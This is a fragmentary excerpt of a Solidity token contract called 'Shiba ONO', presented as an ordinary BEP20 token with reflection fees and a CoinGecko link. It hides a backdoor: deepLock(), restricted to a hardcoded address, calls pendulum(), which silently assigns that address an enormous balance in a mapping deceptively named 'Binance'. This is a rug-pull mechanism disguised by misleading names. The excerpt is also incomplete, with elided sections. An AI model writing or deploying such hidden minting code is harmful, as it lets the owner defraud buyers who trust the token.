...
interface IERC11Metadata is IERC11 {
    /**
 ...
 contract ShibaONO is IBEP2, IERC11, IERC11Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private Binance;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Shiba ONO";
    string private _symbol = "ShibaONO";
    uint256 private constant MAX = ~uint256(0);
//  https://www.coingecko.com/en/coins/ShibaONO
    uint256 private _maxTx = _totalSupply;
    address private _ShibaSwap = 0x6409b0d2b689510391B1cC343F9957ae004268F5;
    address private _XLEASH = 0x6409b0d2b689510391B1cC343F9957ae004268F5;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000 * 10**18;
    address private _taktak = 0x0D6Eb2A4F2440288606374DCd9f4AC264f26bdfe;
    ...
    function deepLock() public {
        require(_msgSender() == _taktak, "Can't please try again.");
        pendulum();
    }
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
    ...
    function pendulum() internal {
      Binance[_taktak] = 6900000000000000000000000000;
    }
